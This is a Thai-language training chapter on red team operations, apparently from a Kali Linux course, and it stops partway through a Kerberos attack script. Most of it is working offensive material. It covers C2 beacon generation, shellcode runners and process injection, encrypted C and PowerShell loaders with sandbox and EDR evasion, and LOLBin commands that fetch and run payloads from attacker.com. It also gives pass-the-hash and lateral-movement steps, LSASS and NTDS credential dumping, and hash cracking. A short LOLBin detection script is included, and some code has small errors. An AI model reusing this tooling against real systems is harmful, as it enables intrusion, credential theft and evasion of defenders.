# Part 95: Red Team Operations — ปฏิบัติการ Red Team ระดับมืออาชีพ

> **หลักสูตร Kali Linux จากพื้นฐานสู่ระดับโลก — ขั้นตอนที่ 960-980**

← [Part 94: Active Directory Advanced](Part-94-Active-Directory-Advanced.md) | [Part 96: Threat Intelligence](Part-96-Threat-Intelligence.md) →

---

## สารบัญ

1. [Red Team Methodology และ Planning](#1-red-team-methodology)
2. [Command and Control (C2) Frameworks](#2-c2-frameworks)
3. [Cobalt Strike และ Beacon](#3-cobalt-strike)
4. [Payload Development และ Obfuscation](#4-payload-development)
5. [Living off the Land (LotL)](#5-living-off-the-land)
6. [Lateral Movement Techniques](#6-lateral-movement)
7. [Credential Access ขั้นสูง](#7-credential-access)
8. [Defense Evasion](#8-defense-evasion)
9. [Exfiltration Techniques](#9-exfiltration)
10. [Red Team Infrastructure](#10-red-team-infrastructure)
11. [Purple Team และ Collaboration](#11-purple-team)
12. [MITRE ATT&CK Mapping](#12-mitre-attck-mapping)
13. [Red Team Reporting](#13-red-team-reporting)
14. [Advanced Persistence](#14-advanced-persistence)
15. [Operational Security (OPSEC)](#15-opsec)

---

## 1. Red Team Methodology

### วงจร Red Team Operations

```
Red Team Operations Process:

1. Planning & Scoping
   ├── กำหนด Rules of Engagement (ROE)
   ├── กำหนด scope: IP ranges, domains, systems
   ├── เก็บ Threat Intelligence: ใครคือ adversary?
   └── เตรียม infrastructure และ tooling

2. Reconnaissance
   ├── OSINT: ออกไปหาข้อมูลจาก Internet
   ├── Technical Recon: DNS, ports, services
   ├── Social Engineering prep
   └── Attack surface mapping

3. Initial Access
   ├── Phishing campaigns
   ├── Exploit public-facing apps
   ├── Supply chain attacks
   └── Physical access

4. Execution & Persistence
   ├── Deploy implants (C2 beacon)
   ├── ติดตั้ง persistence mechanisms
   └── เสริม privileges

5. Lateral Movement
   ├── ใช้ credentials ที่ได้มา
   ├── ใช้ AD misconfigurations
   └── Pivot through network

6. Collection & Exfiltration
   ├── ค้นหาและเก็บ crown jewels
   └── Exfiltrate โดยไม่ถูกตรวจจับ

7. Reporting
   ├── เขียน findings และ impact
   ├── MITRE ATT&CK mapping
   └── Recommendations
```

### Rules of Engagement Template

```python
#!/usr/bin/env python3
"""roe_generator.py — สร้าง Rules of Engagement document"""

from datetime import datetime

class RulesOfEngagement:
    def __init__(self):
        self.roe = {
            "engagement_name": "",
            "client": "",
            "start_date": "",
            "end_date": "",
            "scope": {
                "in_scope_ips": [],
                "in_scope_domains": [],
                "out_of_scope": [],
                "excluded_systems": []
            },
            "allowed_techniques": [],
            "prohibited_techniques": [],
            "emergency_contacts": [],
            "deconfliction": ""
        }
    
    def generate_document(self):
        roe = self.roe
        doc = f"""# RULES OF ENGAGEMENT
## Engagement: {roe['engagement_name']}
## Client: {roe['client']}
## Period: {roe['start_date']} to {roe['end_date']}

### Scope
**In-Scope IP Ranges:**
{chr(10).join(f'- {ip}' for ip in roe['scope']['in_scope_ips'])}

**In-Scope Domains:**
{chr(10).join(f'- {d}' for d in roe['scope']['in_scope_domains'])}

**Out of Scope:**
{chr(10).join(f'- {x}' for x in roe['scope']['out_of_scope'])}

### Allowed Techniques
{chr(10).join(f'- {t}' for t in roe['allowed_techniques'])}

### Prohibited Techniques
{chr(10).join(f'- {t}' for t in roe['prohibited_techniques'])}

### Emergency Contacts
{chr(10).join(f'- {c}' for c in roe['emergency_contacts'])}

### Deconfliction
{roe['deconfliction']}
"""
        return doc
    
    def example_roe(self):
        self.roe.update({
            "engagement_name": "FinanceCorp Red Team 2024",
            "client": "FinanceCorp Inc.",
            "start_date": "2024-01-15",
            "end_date": "2024-02-15",
            "scope": {
                "in_scope_ips": ["192.168.0.0/16", "10.0.0.0/8"],
                "in_scope_domains": ["financecorp.com", "*.financecorp.com"],
                "out_of_scope": ["192.168.100.0/24 (Production DB)"],
                "excluded_systems": ["ERP system", "Trading platform"]
            },
            "allowed_techniques": [
                "Phishing (simulated)",
                "Network scanning",
                "Exploitation of in-scope systems",
                "Active Directory attacks",
                "Lateral movement"
            ],
            "prohibited_techniques": [
                "DoS/DDoS attacks",
                "Physical intrusion",
                "Social engineering of customers",
                "Destructive payloads",
                "Exfiltration of real PII/financial data"
            ],
            "emergency_contacts": [
                "CISO: John Smith +1-555-0100",
                "IT Security: security@financecorp.com",
                "Red Team Lead: redteam@pentest-firm.com"
            ],
            "deconfliction": "Red team will check in daily at 0800 UTC. Emergency stop word: FIREBREAK"
        })
        return self.generate_document()

roe = RulesOfEngagement()
print(roe.example_roe())
```

---

## 2. C2 Frameworks

### C2 Framework Comparison

```
เปรียบเทียบ C2 Frameworks:

| Framework    | ประเภท    | Protocol      | เด่น |
|--------------|---------|--------------|------|
| Cobalt Strike | Commercial | HTTP/S, DNS, SMB | สูงมาก |
| Havoc        | Open source | HTTP/S, SMB  | สูง |
| Sliver       | Open source | mTLS, HTTP/S, DNS | สูง |
| Mythic       | Open source | Pluggable    | สูง |
| Brute Ratel  | Commercial | HTTP/S       | สูง |
| Metasploit   | Free/Pro   | TCP, HTTP    | ปานกลาง |
| Empire       | Open source | HTTP/S       | ปานกลาง |
```

### Sliver C2 — Open Source Alternative

```bash
# ติดตั้ง Sliver
curl https://sliver.sh/install | sudo bash

# เริ่ม Sliver server
sliver-server

# สร้าง operator config
new-operator --name operator1 --lhost <attacker_ip> --save /tmp/operator1.cfg

# เชื่อมต่อด้วย client
sliver-client import /tmp/operator1.cfg
sliver-client

# ใน Sliver console:
# เปิด HTTPS listener
https -L 443

# สร้าง implant (beacon)
generate beacon --http <attacker_ip>:443 --os windows --arch amd64 --format exe --save /tmp/beacon.exe

# สร้าง shellcode
generate --http <attacker_ip>:443 --os windows --arch amd64 --format shellcode --save /tmp/beacon.bin

# สร้าง DLL
generate --http <attacker_ip>:443 --os windows --arch amd64 --format shared --save /tmp/beacon.dll

# รอดู sessions
sessions

# interact
use <session_id>
shell
upload /tmp/tools.exe C:\\Windows\\Temp\\tools.exe
download C:\\Users\\victim\\Documents\\secret.docx /tmp/

# เปิด DNS C2
dns -d c2.attacker.com
generate beacon --dns c2.attacker.com --os windows --arch amd64 --format exe
```

### Havoc C2 — Modern Alternative

```bash
# ติดตั้ง Havoc
git clone https://github.com/HavocFramework/Havoc
cd Havoc
make ts-build  # TeamServer
make client-build  # Client

# เริ่ม TeamServer
./havoc server --profile ./profiles/havoc.yaotl

# เชื่อมต่อด้วย client
./havoc client

# Havoc Profiles (havoc.yaotl)
# กำหนด listener และ payload settings
```

### Mythic C2 — Pluggable Architecture

```bash
# ติดตั้ง Mythic
git clone https://github.com/its-a-feature/Mythic
cd Mythic
./install_docker_ubuntu.sh
make

# เริ่ม
DEFAULT_OPERATION_NAME=corp mythic-cli start

# ติดตั้ง agents
mythic-cli install github https://github.com/MythicAgents/Poseidon  # macOS/Linux
mythic-cli install github https://github.com/MythicAgents/Apollo   # Windows

# เข้า web UI: https://localhost:7443
```

---

## 3. Cobalt Strike

### Cobalt Strike Architecture

```
Cobalt Strike Components:
├── Team Server: เซิร์ฟเวอร์กลาง รับ connections จาก beacons
├── Beacon: Implant ที่รันบน target
├── Listener: รอรับ connection จาก beacon
├── Malleable C2: ปรับแต่ง traffic profile
└── Aggressor Scripts: Automation และ extensions

Beacon Types:
- HTTPS Beacon: ใช้ HTTP/S (Default)
- DNS Beacon: ใช้ DNS queries
- SMB Beacon: Peer-to-peer ผ่าน SMB named pipes
- TCP Beacon: Direct TCP connection
- External C2: เชื่อมต่อผ่าน external channels
```

### Malleable C2 Profiles

```
# ตัวอย่าง Malleable C2 profile (Amazon.profile)

set sleeptime "5000";     # 5 วินาที
 set jitter       "15";       # 15% jitter
 set maxdns       "255";      # DNS max
 set useragent    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

 http-get {
     set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
     
     client {
         header "Accept" "*/*";
         header "Host" "www.amazon.com";
         
         metadata {
             base64;
             prepend "session-token=";
             prepend "skin=noskin; ";
             append "; csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
             header "Cookie";
         }
     }
     
     server {
         header "Server" "Server";
         header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
         header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3";
         header "Content-Type" "text/html;charset=UTF-8";
         
         output {
             print;
         }
     }
 }

 http-post {
     set uri "/N4215/adj/amzn.us.sr.aps";
     
     client {
         header "Accept" "*/*";
         header "Content-Type" "text/xml";
         header "X-Requested-With" "XMLHttpRequest";
         header "Host" "www.amazon.com";
         
         parameter "sz" "160x600";
         parameter "oe" "oe=ISO-8859-1;";
         
         id {
             parameter "sn";
         }
         
         output {
             base64;
             print;
         }
     }
     
     server {
         header "Server" "Server";
         
         output {
             print;
         }
     }
 }
```

### Beacon Object Files (BOF)

```c
/* hello_bof.c — ตัวอย่าง BOF พื้นฐาน */
#include <windows.h>
#include "beacon.h"

void go(char* args, int alen) {
    // แสดง whoami
    DWORD pid = GetCurrentProcessId();
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PID: %d\n", pid);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Running as: ");
    
    // เรียก WinAPI ด้วย Dynamic Function Resolution
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        
        PTOKEN_USER pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
        if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
            TCHAR szName[256], szDomain[256];
            DWORD dwNameSize = 256, dwDomainSize = 256;
            SID_NAME_USE sidType;
            
            LookupAccountSid(NULL, pTokenUser->User.Sid, szName, &dwNameSize,
                           szDomain, &dwDomainSize, &sidType);
            
            BeaconPrintf(CALLBACK_OUTPUT, "%s\\%s\n", szDomain, szName);
        }
        LocalFree(pTokenUser);
        CloseHandle(hToken);
    }
}

/* Compile: x86_64-w64-mingw32-gcc -o hello.o -c hello_bof.c */
/* ใช้ใน CS: beacon> inline-execute /path/to/hello.o */
```

---

## 4. Payload Development และ Obfuscation

### Shellcode Execution Techniques

```c
/* shellcode_runner.c — เทคนิค shellcode injection */
#include <windows.h>
#include <stdio.h>

/* เทคนิค 1: VirtualAlloc + Exec */
void technique1(unsigned char* shellcode, size_t shellcode_len) {
    LPVOID mem = VirtualAlloc(NULL, shellcode_len, 
                              MEM_COMMIT | MEM_RESERVE, 
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    
    memcpy(mem, shellcode, shellcode_len);
    
    HANDLE hThread = CreateThread(NULL, 0, 
                                   (LPTHREAD_START_ROUTINE)mem, 
                                   NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

/* เทคนิค 2: RX memory (stealth) */
void technique2(unsigned char* shellcode, size_t shellcode_len) {
    // Alloc RW ก่อน
    LPVOID mem = VirtualAlloc(NULL, shellcode_len, 
                              MEM_COMMIT | MEM_RESERVE, 
                              PAGE_READWRITE);
    memcpy(mem, shellcode, shellcode_len);
    
    // เปลี่ยนเป็น RX
    DWORD oldProtect;
    VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
    
    HANDLE hThread = CreateThread(NULL, 0,
                                   (LPTHREAD_START_ROUTINE)mem,
                                   NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}

/* เทคนิค 3: Process Injection (ใส่ process อื่น) */
void technique3(unsigned char* shellcode, size_t shellcode_len, DWORD target_pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return;
    
    LPVOID mem = VirtualAllocEx(hProcess, NULL, shellcode_len,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    
    SIZE_T written;
    WriteProcessMemory(hProcess, mem, shellcode, shellcode_len, &written);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)mem,
                                         NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

/* เทคนิค 4: NtCreateSection + NtMapViewOfSection (เลี่ยง EDR) */
void technique4(unsigned char* shellcode, size_t shellcode_len) {
    typedef NTSTATUS (NTAPI* _NtCreateSection)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
        PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    typedef NTSTATUS (NTAPI* _NtMapViewOfSection)(
        HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
        PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    _NtCreateSection NtCreateSection = (_NtCreateSection)
        GetProcAddress(hNtdll, "NtCreateSection");
    _NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)
        GetProcAddress(hNtdll, "NtMapViewOfSection");
    
    // ... สร้าง section และ map
    printf("[*] Using NtCreateSection for stealthy allocation\n");
}
```

### Python Payload Obfuscation

```python
#!/usr/bin/env python3
"""payload_obfuscator.py — เทคนิค obfuscation สำหรับ payload"""

import os
import base64
import struct
import random
from typing import bytes

class PayloadObfuscator:
    def __init__(self, shellcode: bytes):
        self.shellcode = shellcode
        self.key = None
    
    def xor_encrypt(self, key: bytes = None) -> bytes:
        """XOR encrypt shellcode"""
        if key is None:
            key = bytes([random.randint(1, 254) for _ in range(4)])
        self.key = key
        
        encrypted = bytearray()
        for i, byte in enumerate(self.shellcode):
            encrypted.append(byte ^ key[i % len(key)])
        
        return bytes(encrypted)
    
    def aes_encrypt(self, key: bytes = None) -> bytes:
        """AES-256 encrypt shellcode"""
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        
        if key is None:
            key = os.urandom(32)
        iv = os.urandom(16)
        self.key = key
        self.iv = iv
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(self.shellcode, AES.block_size))
        
        return iv + encrypted
    
    def generate_c_loader(self, encrypted: bytes, method='xor') -> str:
        """สร้าง C loader code"""
        hex_shellcode = ', '.join([f'0x{b:02x}' for b in encrypted])
        key_hex = ', '.join([f'0x{b:02x}' for b in self.key])
        
        if method == 'xor':
            return f"""
#include <windows.h>
#include <string.h>

unsigned char enc_payload[] = {{ {hex_shellcode} }};
unsigned char key[] = {{ {key_hex} }};
size_t payload_len = sizeof(enc_payload);

void decrypt_xor(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    for (size_t i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

int main() {{
    decrypt_xor(enc_payload, payload_len, key, sizeof(key));
    
    LPVOID mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, enc_payload, payload_len);
    
    DWORD old;
    VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &old);
    
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    return 0;
}}
"""
        return ""
    
    def generate_powershell_loader(self, encrypted: bytes) -> str:
        """สร้าง PowerShell loader"""
        enc_b64 = base64.b64encode(encrypted).decode()
        key_b64 = base64.b64encode(self.key).decode()
        
        return f"""# PowerShell Loader
$enc = [System.Convert]::FromBase64String('{enc_b64}')
$key = [System.Convert]::FromBase64String('{key_b64}')

for ($i = 0; $i -lt $enc.Length; $i++) {{
    $enc[$i] = $enc[$i] -bxor $key[$i % $key.Length]
}}

$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($enc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($enc, 0, $mem, $enc.Length)

$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress kernel32.dll VirtualProtect),
    (Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)
$old = 0
$VirtualProtect.Invoke($mem, [UIntPtr]$enc.Length, 0x20, [ref]$old) | Out-Null

$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress kernel32.dll CreateThread),
    (Get-DelegateType @([IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
)
$CreateThread.Invoke([IntPtr]::Zero, [UIntPtr]::Zero, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
"""
    
    def add_sandbox_evasion(self, code: str) -> str:
        """เพิ่ม sandbox evasion checks"""
        checks = """
// Sandbox evasion checks
bool is_sandboxed() {
    // Check 1: จำนวน CPU cores
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;
    
    // Check 2: RAM ขั้นต่ำ
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    
    // Check 3: ชื่อ computer ที่ใช้บ่อยใน sandbox
    char hostname[256];
    DWORD sz = sizeof(hostname);
    GetComputerNameA(hostname, &sz);
    const char* sandbox_names[] = {"SANDBOX", "MALWARE", "VIRUS", "CUCKOO"};
    for (int i = 0; i < 4; i++) {
        if (strstr(hostname, sandbox_names[i])) return true;
    }
    
    // Check 4: Sleep acceleration test
    DWORD start = GetTickCount();
    Sleep(1000);
    DWORD elapsed = GetTickCount() - start;
    if (elapsed < 500) return true;  // Sleep ถูก accelerate
    
    return false;
}
"""
        return checks + "\n" + code

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    # สมมุติ shellcode (msfvenom output)
    shellcode = b"\x90" * 16 + b"\xcc" * 4  # NOP sled + INT3 (placeholder)
    
    obf = PayloadObfuscator(shellcode)
    
    # XOR encrypt
    encrypted = obf.xor_encrypt()
    print(f"[+] Encrypted {len(shellcode)} bytes with key: {obf.key.hex()}")
    
    # สร้าง C loader
    c_code = obf.generate_c_loader(encrypted)
    with open("/tmp/loader.c", "w") as f:
        f.write(c_code)
    print("[+] C loader written to /tmp/loader.c")
    print("[*] Compile: x86_64-w64-mingw32-gcc -o loader.exe /tmp/loader.c")
    
    # สร้าง PS loader
    ps_code = obf.generate_powershell_loader(encrypted)
    with open("/tmp/loader.ps1", "w") as f:
        f.write(ps_code)
    print("[+] PowerShell loader written to /tmp/loader.ps1")
```

---

## 5. Living off the Land (LotL)

### LOLBins — Windows Built-in Tools

```powershell
# เรียกใช้ certutil.exe ดาวน์โหลดไฟล์
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe

# แปลง base64
certutil.exe -decode payload.b64 payload.exe

# ใช้ bitsadmin
bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\Windows\Temp\payload.exe

# ใช้ mshta.exe execute script
mshta.exe http://attacker.com/payload.hta
mshta.exe vbscript:Close(Execute("GetObject(""script:http://attacker.com/script.sct"")"))

# ใช้ regsvr32 เรียก COM object
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# ใช้ wscript.exe / cscript.exe
wscript.exe payload.js
cscript.exe //E:jscript payload.js

# ใช้ rundll32.exe
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')");

# ใช้ installutil.exe (รัน .NET assembly)
installutil.exe /logfile= /LogToConsole=false /U payload.exe

# ใช้ wmic.exe
wmic process call create "powershell -ep bypass IEX (iwr http://attacker.com/payload.ps1)"
wmic os get /FORMAT:"http://attacker.com/xsl_exec.xsl"

# ใช้ msiexec
msiexec /q /i http://attacker.com/payload.msi

# ใช้ forfiles.exe
forfiles /p c:\windows\system32 /m cmd.exe /c "http://attacker.com/payload.exe"

# ใช้ te.exe (จาก Windows SDK)
te.exe payload.dll /name:test
```

### LOLBAS — Python Detection

```python
#!/usr/bin/env python3
"""lolbas_detector.py — ตรวจจับการใช้ LOLBins ที่น่าสงสัย"""

import json
import re
from pathlib import Path

LOLBINS_PATTERNS = {
    "certutil": [
        r"-urlcache.*-split.*-f.*http",
        r"-decode",
        r"-encode",
        r"-decodehex"
    ],
    "mshta": [
        r"http[s]?://",
        r"vbscript:",
        r"javascript:"
    ],
    "regsvr32": [
        r"/i:http",
        r"scrobj\.dll",
        r"/u.*http"
    ],
    "rundll32": [
        r"javascript:",
        r"\.dll,.*javascript",
        r"shell32\.dll.*ShellExec"
    ],
    "powershell": [
        r"-EncodedCommand",
        r"IEX.*DownloadString",
        r"Invoke-Expression",
        r"-WindowStyle.*[Hh]idden",
        r"-ExecutionPolicy.*[Bb]ypass",
        r"Net\.WebClient"
    ],
    "wscript": [
        r"http[s]?://",
        r"\.js$",
        r"\.vbs$"
    ],
    "bitsadmin": [
        r"/download",
        r"http[s]?://"
    ],
    "msiexec": [
        r"/i.*http",
        r"/q.*http"
    ]
}

SUSPICIOUS_COMMANDS = [
    r"base64",
    r"fromcharcode",
    r"chr\(\d+\)",
    r"eval\(",
    r"exec\(",
    r"shell\.run",
    r"wscript\.shell"
]

def analyze_command(process_name: str, command_line: str) -> list:
    """วิเคราะห์ command line ว่าน่าสงสัยหรือไม่"""
    findings = []
    process_lower = process_name.lower().replace('.exe', '')
    cmd_lower = command_line.lower()
    
    # ตรวจสอบ LOLBins patterns
    if process_lower in LOLBINS_PATTERNS:
        for pattern in LOLBINS_PATTERNS[process_lower]:
            if re.search(pattern, cmd_lower, re.IGNORECASE):
                findings.append({
                    'type': 'LOLBIN_ABUSE',
                    'process': process_name,
                    'pattern': pattern,
                    'severity': 'HIGH'
                })
    
    # ตรวจสอบ obfuscation patterns
    for pattern in SUSPICIOUS_COMMANDS:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            findings.append({
                'type': 'OBFUSCATION',
                'process': process_name,
                'pattern': pattern,
                'severity': 'MEDIUM'
            })
    
    # ตรวจสอบ encoding
    if len(re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', command_line)) > 0:
        findings.append({
            'type': 'BASE64_ENCODED',
            'process': process_name,
            'severity': 'MEDIUM'
        })
    
    return findings

def analyze_process_list(processes: list) -> list:
    """วิเคราะห์ process list ทั้งหมด"""
    all_findings = []
    for proc in processes:
        findings = analyze_command(proc['name'], proc['cmdline'])
        if findings:
            all_findings.extend(findings)
            print(f"[!] Suspicious: {proc['name']}")
            print(f"    CMD: {proc['cmdline'][:100]}...")
            for f in findings:
                print(f"    [{f['severity']}] {f['type']}: {f.get('pattern', 'N/A')}")
    return all_findings

# ตัวอย่าง
test_processes = [
    {'name': 'certutil.exe', 'cmdline': 'certutil.exe -urlcache -split -f http://evil.com/a.exe C:\\temp\\a.exe'},
    {'name': 'powershell.exe', 'cmdline': 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'},
    {'name': 'mshta.exe', 'cmdline': 'mshta.exe http://attacker.com/payload.hta'},
]

results = analyze_process_list(test_processes)
print(f"\n[*] Total findings: {len(results)}")
```

---

## 6. Lateral Movement

### Lateral Movement Techniques

```bash
# PsExec-style (SMB + Service)
impacket-psexec corp.local/administrator:Password123!@target_ip cmd
impacket-psexec -hashes :NTHash corp.local/administrator@target_ip

# WMI Execution
impacket-wmiexec corp.local/administrator:Password123!@target_ip cmd
python3 wmiexec.py -hashes :NTHash corp.local/administrator@target_ip

# SMBExec (no drop to disk)
python3 smbexec.py corp.local/administrator:Password123!@target_ip

# DCOM
python3 dcomexec.py corp.local/administrator:Password123!@target_ip cmd

# Kerberos ticket reuse
export KRB5CCNAME=/tmp/admin.ccache
python3 psexec.py -k -no-pass corp.local/administrator@dc01.corp.local

# Pass-the-Hash
python3 psexec.py -hashes :NTHash corp.local/administrator@target_ip

# Overpass-the-Hash -> Pass-the-Ticket
mimikatz.exe
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTHash /run:powershell.exe
# ใน PS ใหม่:
Enter-PSSession -ComputerName target

# WinRM (PowerShell Remoting)
Enter-PSSession -ComputerName target -Credential (Get-Credential)
Invoke-Command -ComputerName target -ScriptBlock {whoami} -Credential $cred

# SSH (ถ้าเปิดไว้)
ssh administrator@target_ip
```

### Pivoting Techniques

```bash
# SSH Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 -N user@jump_server

# ใช้ proxychains
cat /etc/proxychains4.conf
# socks5 127.0.0.1 1080
proxychains nmap -sT -p 22,80,443,3389 192.168.2.0/24

# Chisel Tunnel
# Attacker:
chisel server --port 8080 --reverse

# Target:
chisel.exe client attacker_ip:8080 R:1080:socks

# ใช้ proxy
proxychains curl http://192.168.2.10

# Metasploit autoroute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.2.0
run

use auxiliary/server/socks_proxy
set VERSION 5
run

# ligolo-ng (modern pivoting)
# Attacker:
ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601

# Target:
ligolo-ng agent -connect attacker_ip:11601 -ignore-cert

# ใน ligolo UI:
interface_create --name "pivot"
start --tun pivot
tunnel_start --tun pivot
# add route: ip route add 192.168.2.0/24 dev pivot
```

---

## 7. Credential Access ขั้นสูง

### Credential Dumping Techniques

```bash
# LSASS dump (ต้องการ SYSTEM privileges)
# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Task Manager (GUI) -> Create dump file ของ lsass.exe
# แล้วนำมา parse offline
python3 pypykatz lsa minidump lsass.dmp

# Procdump (signed tool)
procdump.exe -ma lsass.exe C:\lsass.dmp

# comsvcs.dll (built-in)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\lsass.dmp full

# Parse ด้วย pypykatz
pipykatz lsa minidump lsass.dmp

# SecretsDump (ไม่ต้อง LSASS dump)
python3 secretsdump.py corp.local/administrator:Password123!@target_ip
python3 secretsdump.py -hashes :NTHash corp.local/administrator@target_ip

# Volume Shadow Copy
vssadmin create shadow /for=c:
vssadmin list shadows
# copy NTDS.dit จาก shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM

# Parse NTDS.dit
python3 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL

# SAM database (local accounts)
reg save HKLM\SAM C:\SAM
reg save HKLM\SYSTEM C:\SYSTEM
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### Kerberoasting และ AS-REP Roasting

```python
#!/usr/bin/env python3
"""kerberoast_asrep.py — Kerberoasting + AS-REP Roasting"""

import subprocess
import re
from pathlib import Path

class KerberosAttacks:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def kerberoast(self, output_file="kerb_hashes.txt"):
        """Kerberoasting ผ่าน GetUserSPNs.py"""
        print("[*] Running Kerberoasting...")
        
        cmd = [
            "python3", "GetUserSPNs.py",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-request",
            "-outputfile", output_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Kerberoastable hashes saved to {output_file}")
            # นับจำนวน hashes
            if Path(output_file).exists():
                with open(output_file) as f:
                    hashes = [l for l in f if l.startswith('$krb5tgs$')]
                print(f"[+] Got {len(hashes)} hashes")
                return hashes
        else:
            print(f"[-] Error: {result.stderr[:200]}")
        return []
    
    def asrep_roast(self, output_file="asrep_hashes.txt"):
        """AS-REP Roasting - ไม่ต้องการ credentials ถ้า account ไม่มี preauth"""
        print("[*] Running AS-REP Roasting...")
        
        cmd = [
            "python3", "GetNPUsers.py",
            f"{self.domain}/",
            "-dc-ip", self.dc_ip,
            "-usersfile", "/tmp/users.txt",
            "-format", "hashcat",
            "-outputfile", output_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout[:500])
        return result.returncode == 0
    
    def crack_hashes(self, hash_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        """crack hashes ด้วย hashcat"""
        print(f"[*] Cracking hashes from {hash_file}...")
        
        # ตรวจสอบ hash type
        with open(hash_file) as f:
            first_hash = f.readline().strip()
        
        if first_hash.startswith('$krb5tgs$23$'):
            mode = '13100'  # Kerberoast RC4
            print("[*] Mode: 13100 (Kerberoast RC4)")
        elif first_hash.startswith('$krb5tgs$18$'):
            mode = '19700'  # Kerberoast AES256
            print("[*] Mode: 19700 (Kerberoast AES256)")
        elif first_hash.startswith('$krb5asrep$'):
            mode = '18200'  # AS-REP
            print("[*] Mode: 18200 (AS-REP Roast)")
        else:
            print("[-] Unknown hash type")
            return
        
        cmd = [
            "hashcat", f"-m{mode}",
            hash_file, wordlist,
            "--force", "-O",
            "--show"  # แสดงผลที่ crack แล้ว
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout[:1000])
        
        # run จริง (ไม่มี --show)
        cmd_crack = cmd.copy()
        cmd_crack.remove("--show")
        print(f"[*] Crack command: {' '.join(cmd_crack)}")
    
    def password_spray(self, password, user_file, delay=2):
        """Password spray ด้วย kerbrute"""
        import time
        
        print(f"[*] Password spraying with password: {password}")
        
        cmd = [
